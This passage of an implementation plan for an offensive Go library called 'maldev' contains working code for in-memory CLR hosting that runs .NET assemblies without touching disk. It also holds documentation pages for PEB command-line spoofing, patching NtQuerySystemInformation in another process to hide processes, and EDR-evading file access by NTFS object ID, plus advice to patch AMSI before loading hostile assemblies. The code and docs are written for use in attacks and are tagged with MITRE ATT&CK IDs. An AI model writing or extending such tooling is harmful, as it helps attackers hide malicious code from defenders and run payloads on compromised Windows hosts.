        return "", fmt.Errorf("Invoke: %w", err)
    }
    return "", nil
}

// ExecuteDLL loads a .NET DLL from memory and invokes typeName.methodName(arg).
func (rt *Runtime) ExecuteDLL(dll []byte, typeName, methodName, arg string) (int, error) {
    domain, err := rt.getDefaultDomain()
    if err != nil {
        return 0, err
    }
    defer releaseUnknown(domain)

    domainDisp, err := queryIDispatch(domain)
    if err != nil {
        return 0, err
    }
    defer domainDisp.Release()

    safeArray, err := bytesToSafeArray(dll)
    if err != nil {
        return 0, err
    }
    defer windows.SafeArrayDestroy(safeArray)

    assemblyVar := ole.NewVariant(ole.VT_ARRAY|ole.VT_UI1, int64(uintptr(unsafe.Pointer(safeArray))))
    loadResult, err := oleutil.CallMethod(domainDisp, "Load_3", assemblyVar)
    if err != nil {
        return 0, fmt.Errorf("Load_3: %w", err)
    }
    assemblyObj := loadResult.ToIDispatch()
    defer assemblyObj.Release()

    typeVar, err := oleutil.CallMethod(assemblyObj, "GetType", typeName)
    if err != nil {
        return 0, fmt.Errorf("GetType(%s): %w", typeName, err)
    }
    typeObj := typeVar.ToIDispatch()
    defer typeObj.Release()

    methodVar, err := oleutil.CallMethod(typeObj, "GetMethod", methodName)
    if err != nil {
        return 0, fmt.Errorf("GetMethod(%s): %w", methodName, err)
    }
    method := methodVar.ToIDispatch()
    defer method.Release()

    argArray := toOleStringArray([]string{arg})
    retVar, err := oleutil.CallMethod(method, "Invoke", ole.NewVariant(ole.VT_NULL, 0), argArray)
    if err != nil {
        return 0, fmt.Errorf("Invoke: %w", err)
    }
    return int(retVar.Val), nil
}

// Close releases the ICORRuntimeHost reference.
func (rt *Runtime) Close() {
    if rt.host != 0 {
        releaseUnknown(rt.host)
        rt.host = 0
    }
}

// --- helpers ---

func releaseUnknown(ptr uintptr) {
    if ptr == 0 {
        return
    }
    vtbl := (*iUnknownVtbl)(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(ptr))))
    syscall.SyscallN(vtbl.Release, ptr)
}

func pickRuntime(metaHost uintptr) (string, error) {
    runtimes, err := InstalledRuntimes()
    if err != nil || len(runtimes) == 0 {
        return "v4.0.30319", nil // safe default
    }
    // Prefer v4, otherwise take last entry.
    for _, v := range runtimes {
        if len(v) >= 2 && v[1] == '4' {
            return v, nil
        }
    }
    return runtimes[len(runtimes)-1], nil
}

func getRuntime(metaHost uintptr, version string) (uintptr, error) {
    versionW, _ := windows.UTF16PtrFromString(version)
    var runtimeInfo uintptr
    vtbl := (*iCLRMetaHostVtbl)(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(metaHost))))
    r, _, _ := syscall.SyscallN(vtbl.GetRuntime,
        metaHost,
        uintptr(unsafe.Pointer(versionW)),
        uintptr(unsafe.Pointer(iidICLRRuntimeInfo)),
        uintptr(unsafe.Pointer(&runtimeInfo)),
    )
    if r != 0 {
        return 0, fmt.Errorf("ICLRMetaHost.GetRuntime(%s): HRESULT 0x%X", version, uint32(r))
    }
    return runtimeInfo, nil
}

func getRuntimeHost(runtimeInfo uintptr) (uintptr, error) {
    var host uintptr
    vtbl := (*iCLRRuntimeInfoVtbl)(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(runtimeInfo))))
    r, _, _ := syscall.SyscallN(vtbl.GetInterface,
        runtimeInfo,
        uintptr(unsafe.Pointer(clsidCLRRuntimeHost)),
        uintptr(unsafe.Pointer(iidICORRuntimeHost)),
        uintptr(unsafe.Pointer(&host)),
    )
    if r != 0 {
        return 0, fmt.Errorf("ICLRRuntimeInfo.GetInterface(ICORRuntimeHost): HRESULT 0x%X", uint32(r))
    }
    return host, nil
}

func runtimeVersion(runtimeInfo uintptr) string {
    vtbl := (*iCLRRuntimeInfoVtbl)(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(runtimeInfo))))
    buf := make([]uint16, 64)
    size := uint32(len(buf))
    r, _, _ := syscall.SyscallN(vtbl.GetVersionString,
        runtimeInfo,
        uintptr(unsafe.Pointer(&buf[0])),
        uintptr(unsafe.Pointer(&size)),
    )
    if r != 0 {
        return ""
    }
    return windows.UTF16ToString(buf[:size])
}

func (rt *Runtime) getDefaultDomain() (uintptr, error) {
    var domainUnk uintptr
    vtbl := (*iCorRuntimeHostVtbl)(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(rt.host))))
    r, _, _ := syscall.SyscallN(vtbl.GetDefaultDomain,
        rt.host,
        uintptr(unsafe.Pointer(&domainUnk)),
    )
    if r != 0 {
        return 0, fmt.Errorf("ICORRuntimeHost.GetDefaultDomain: HRESULT 0x%X", uint32(r))
    }
    return domainUnk, nil
}

func queryIDispatch(ptr uintptr) (*ole.IDispatch, error) {
    unknown := (*ole.IUnknown)(unsafe.Pointer(ptr))
    return unknown.QueryInterface(ole.IID_IDispatch)
}

func bytesToSafeArray(data []byte) (*windows.SAFEARRAY, error) {
    sa, err := windows.SafeArrayCreateVector(windows.VT_UI1, 0, uint32(len(data)))
    if err != nil {
        return nil, fmt.Errorf("SafeArrayCreateVector: %w", err)
    }
    dataPtr, err := windows.SafeArrayAccessData(sa)
    if err != nil {
        windows.SafeArrayDestroy(sa) //nolint:errcheck
        return nil, fmt.Errorf("SafeArrayAccessData: %w", err)
    }
    copy((*[1 << 30]byte)(dataPtr)[:len(data)], data)
    windows.SafeArrayUnaccessData(sa) //nolint:errcheck
    return sa, nil
}

func stringsToSafeArray(strs []string) (*windows.SAFEARRAY, error) {
    sa, err := windows.SafeArrayCreateVector(windows.VT_BSTR, 0, uint32(len(strs)))
    if err != nil {
        return nil, fmt.Errorf("SafeArrayCreateVector(BSTR): %w", err)
    }
    return sa, nil
}

func toOleStringArray(strs []string) *ole.VARIANT {
    // Pass as VARIANT containing SAFEARRAY of BSTR.
    // For simplicity, pass as a single joined string if one arg.
    if len(strs) == 0 {
        return ole.NewVariant(ole.VT_NULL, 0)
    }
    combined := ""
    for i, s := range strs {
        if i > 0 {
            combined += " "
        }
        combined += s
    }
    v := ole.NewVariant(ole.VT_BSTR, 0)
    v.Val = int64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(combined))))
    return &v
}

// Ensure ole import used.
var _ = bytes.NewBuffer
```

The `oleutil` import needs to be added: `"github.com/go-ole/go-ole/oleutil"`.

- [ ] **Step 5: Create doc.go**

```go
// pe/clr/doc.go

// Package clr loads the .NET Common Language Runtime (CLR) in-process via the
// ICLRMetaHost / ICORRuntimeHost COM interfaces and executes .NET assemblies
// from memory without writing to disk.
//
// MITRE ATT&CK: T1620 — Reflective Code Loading
// Detection: Medium (CLR loaded in non-.NET host process is suspicious;
//            AMSI v2 scans assemblies loaded via AppDomain.Load)
//
// Prerequisite: call evasion/amsi.PatchAll() before loading hostile assemblies.
//
// Example:
//
//	rt, err := clr.Load(nil)
//	if err != nil { log.Fatal(err) }
//	defer rt.Close()
//
//	assembly, _ := os.ReadFile("Seatbelt.exe")
//	output, err := rt.ExecuteAssembly(assembly, []string{"-group=system"})
package clr
```

- [ ] **Step 6: Run tests and build**

```
go test ./pe/clr/... -v -count=1
go build $(go list ./...)
```
Expected: `TestInstalledRuntimes` and `TestLoad` PASS (any Windows with .NET 4.x).

- [ ] **Step 7: Commit**

```bash
git add pe/clr/
git commit -m "feat(clr): in-process .NET assembly execution via ICORRuntimeHost — T1620"
```

---

## Task 9: Documentation & README updates

**Files:**
- Create: `docs/techniques/evasion/fakecmd.md`
- Create: `docs/techniques/evasion/hideprocess.md`
- Create: `docs/techniques/evasion/stealthopen.md`
- Create: `docs/techniques/pe/clr.md`
- Modify: `docs/techniques/evasion/README.md` — add fakecmd, hideprocess, stealthopen rows
- Modify: `docs/techniques/pe/README.md` — add CLR row
- Modify: `README.md` — update Packages table and Technique Reference

- [ ] **Step 1: Create docs/techniques/evasion/fakecmd.md**

```markdown
# FakeCmdLine — PEB CommandLine Overwrite

[<- Back to Evasion](README.md)

## What It Does

Overwrites the `CommandLine` field in the process's PEB (Process Environment Block) so that process-listing tools display a fake command line rather than the real one.

## How It Works

Every Windows process has a PEB at a known address accessible via `NtQueryInformationProcess(ProcessBasicInformation)`. The PEB contains a pointer to `RTL_USER_PROCESS_PARAMETERS`, which holds the `CommandLine` as a `UNICODE_STRING`. Overwriting the `Buffer` pointer and `Length` fields makes any usermode tool that reads this structure (Process Explorer, WMIC, PowerShell `Get-Process`) see the fake string.

The real command line recorded in the kernel's `EPROCESS.SeAuditProcessCreationInfo` is not affected — EDR kernel callbacks still see the original.

```mermaid
graph LR
    A["NtQueryInformationProcess\n(ProcessBasicInformation)"] --> B["PEB.PebBaseAddress"]
    B --> C["PEB+0x20\nProcessParameters ptr"]
    C --> D["RTL_USER_PROCESS_PARAMETERS\n+0x70 CommandLine UNICODE_STRING"]
    D --> E["Overwrite Length + Buffer"]
```

## API

```go
// Spoof overwrites the current process PEB CommandLine.
func Spoof(fakeCmd string, caller *wsyscall.Caller) error

// Restore reverts to the command line saved before the first Spoof call.
func Restore() error

// Current reads back the active PEB CommandLine.
func Current() string
```

## Usage

```go
import "github.com/oioio-space/maldev/evasion/fakecmd"

if err := fakecmd.Spoof(`C:\Windows\System32\svchost.exe -k netsvcs`, nil); err != nil {
    log.Fatal(err)
}
defer fakecmd.Restore()
```

## MITRE ATT&CK

| Technique | ID | Notes |
|-----------|-----|-------|
| Masquerading: Match Legitimate Name or Location | [T1036.005](https://attack.mitre.org/techniques/T1036/005/) | PEB CommandLine overwrite |

## Detection

**Low** — In-memory only. Kernel `EPROCESS.SeAuditProcessCreationInfo` retains the original. EDR kernel callbacks (e.g., PsSetCreateProcessNotifyRoutine) see the real command line at process creation time.
```

- [ ] **Step 2: Create docs/techniques/evasion/hideprocess.md** (similar format, T1564.001)

Create `docs/techniques/evasion/hideprocess.md`:

```markdown
# HideProcess — NtQuerySystemInformation Patch

[<- Back to Evasion](README.md)

## What It Does

Patches the first bytes of `NtQuerySystemInformation` in a target process with a stub that returns `STATUS_NOT_IMPLEMENTED (0xC0000002)`, blinding that process's ability to enumerate running processes.

## How It Works

Tools like Task Manager and Process Explorer enumerate processes by calling `NtQuerySystemInformation(SystemProcessInformation, ...)`. By writing `mov eax, 0xC0000002; ret` (6 bytes) to the start of that function in the target's ntdll.dll, every call to it from that process fails immediately.

Since ASLR on Windows 8+ randomises ntdll base only once per boot (shared across all processes via the same physical pages), the ntdll virtual address is identical in every process — so we resolve the function address locally and write to that same VA in the target.

## API

```go
// PatchProcessMonitor patches NtQuerySystemInformation in the target process.
// Requires PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the target.
func PatchProcessMonitor(pid int, caller *wsyscall.Caller) error
```

## MITRE ATT&CK

| Technique | ID |
|-----------|-----|
| Hide Artifacts: Hidden Process | [T1564.001](https://attack.mitre.org/techniques/T1564/001/) |

## Detection

**Medium** — Any integrity-checking product that verifies ntdll bytes in running processes will detect the overwrite.
```

- [ ] **Step 3: Create docs/techniques/evasion/stealthopen.md and docs/techniques/pe/clr.md**

Create `docs/techniques/evasion/stealthopen.md`:

```markdown
# StealthOpen — NTFS Object ID File Access

[<- Back to Evasion](README.md)

## What It Does

Opens files by their NTFS Object ID (a 128-bit GUID stored in the MFT) instead of by path, bypassing path-based EDR hooks on `NtCreateFile`.

## How It Works

Every NTFS file can have a 128-bit Object ID (created by `FSCTL_CREATE_OR_GET_OBJECT_ID`). Win32 `OpenFileById` with `ObjectIdType` opens the file by its GUID rather than a path. EDR products that hook `NtCreateFile` and inspect the filename won't see a recognisable path.

## API

```go
func GetObjectID(path string) ([16]byte, error)
func SetObjectID(path string, objectID [16]byte) error
func OpenByID(volumePath string, objectID [16]byte) (*os.File, error)
```

## MITRE ATT&CK

| Technique | ID |
|-----------|-----|
| Masquerading | [T1036](https://attack.mitre.org/techniques/T1036/) |

## Detection

**Low** — Object ID-based access is not logged by most path-based EDR filters.
```

Create `docs/techniques/pe/clr.md`:

```markdown
# CLR Hosting — In-Process .NET Execution

[<- Back to PE Operations](README.md)

## What It Does

Loads the .NET Common Language Runtime (CLR) into the current process and executes .NET assemblies from memory without writing to disk.

## How It Works

`mscoree.dll` exports `CLRCreateInstance` which returns an `ICLRMetaHost` interface. From there we get `ICLRRuntimeInfo` for the target .NET version, then `ICORRuntimeHost`. Calling `Start()` initialises the runtime in-process. The default `AppDomain` can then load assemblies via `Load_3(SAFEARRAY of bytes)` and invoke their entry point or a specific method.

## API

```go
func Load(caller *wsyscall.Caller) (*Runtime, error)
func InstalledRuntimes() ([]string, error)
func (r *Runtime) ExecuteAssembly(assembly []byte, args []string) (string, error)
func (r *Runtime) ExecuteDLL(dll []byte, typeName, methodName, arg string) (int, error)
func (r *Runtime) Close()
```

## Compared to pe/srdi

| | `pe/clr` | `pe/srdi` |
|--|---------|---------|
| Target | Current process | Any remote process |
| .NET support | Yes (native) | Yes (donut stub) |
| Disk writes | None | None |
| AMSI exposure | AppDomain.Load scanned | Donut loader scanned |

## MITRE ATT&CK

| Technique | ID |
|-----------|-----|
| Reflective Code Loading | [T1620](https://attack.mitre.org/techniques/T1620/) |

## Detection

**Medium** — CLR loaded in a non-.NET host process is a Sysmon indicator. AMSI v2 scans AppDomain.Load assemblies — call `evasion/amsi.PatchAll()` first.
```

- [ ] **Step 4: Update docs/techniques/evasion/README.md**

Add rows to the Documentation table:

```markdown
| [FakeCmdLine](fakecmd.md) | PEB CommandLine overwrite — T1036.005 |
| [HideProcess](hideprocess.md) | Blind process monitors via NtQSI patch — T1564.001 |
| [StealthOpen](stealthopen.md) | Open files by NTFS Object ID — T1036 |
```

- [ ] **Step 5: Update docs/techniques/pe/README.md**

Add row:

```markdown
| [CLR Hosting](clr.md) | In-process .NET execution via ICORRuntimeHost — T1620 |
```

- [ ] **Step 6: Update README.md**

In the **Packages** table, update:
- Evasion row: add `evasion/fakecmd/` `evasion/hideprocess/` `evasion/stealthopen/`
- PE Operations row: add `pe/clr/`

In the **Technique Reference** table, update:
- Evasion row: add `[FakeCmdLine](docs/techniques/evasion/fakecmd.md)` · `[HideProcess](docs/techniques/evasion/hideprocess.md)` · `[StealthOpen](docs/techniques/evasion/stealthopen.md)`
- PE Operations row: add `[CLR Hosting](docs/techniques/pe/clr.md)`

- [ ] **Step 7: Build and commit**

```
go build $(go list ./...)
git add docs/ README.md
git commit -m "docs: Sprint 2 technique pages — fakecmd, hideprocess, stealthopen, CLR"
```

---

## Self-Review

**Spec coverage:**
- ✅ 2.1 FakeCmdLine → Task 1
- ✅ 2.2 TrustedInstaller → Task 3
- ✅ 2.3 HideProcess → Task 4
- ✅ 2.4 StealthOpen → Task 5
- ✅ 2.5 New callbacks (3) → Task 6
- ✅ 2.6 Task Scheduler COM → Task 7
- ✅ 2.7 CLR Hosting → Task 8
- ✅ 2.7b EnableAll → Task 2
- ✅ Docs → Task 9

**Type consistency check:**
- `fakecmd.Spoof(fakeCmd string, caller *wsyscall.Caller)` — consistent in impl, test, doc
- `scheduler.Create(name string, opts ...Option)` — consistent across Create/TaskMechanism
- `clr.Runtime` returned from `Load()`, used in `ExecuteAssembly/ExecuteDLL/Close` — consistent
- `hideprocess.PatchProcessMonitor(pid int, caller *wsyscall.Caller)` — consistent
- `stealthopen.OpenByID(volumePath string, objectID [16]byte) (*os.File, error)` — consistent

**Placeholder scan:** None found.

**Notes for implementer:**
1. The CLR vtable offsets (GetDefaultDomain at index 10, Start at index 7 etc.) must match the actual COM interface — cross-check with ropnop/go-clr source for exact vtable layouts before implementing.
2. `executeReadDirChanges` requires the shellcode to be a valid Windows PAPCFUNC (`VOID CALLBACK fn(ULONG_PTR)`). A simple `\xC3` (ret) satisfies this in tests.
3. The Task Scheduler COM `RegisterTaskDefinition` LOGON_TYPE may need adjusting if running as SYSTEM — use `TASK_LOGON_SERVICE_ACCOUNT (5)` in that case.
4. `pe/clr` imports `bytes` (unused in the stub shown — remove if not needed after final implementation).
